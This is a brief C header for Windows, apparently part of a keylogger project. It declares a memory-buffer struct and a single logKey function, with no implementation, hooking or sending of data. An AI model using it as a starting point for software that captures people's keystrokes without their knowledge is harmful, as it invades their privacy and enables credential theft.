#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <Windows.h>

typedef struct {
	char* baseAddress;
	size_t size;
	size_t used;
} MemoryRegion;

int logKey(int _key, MemoryRegion* memRegion);
#endif
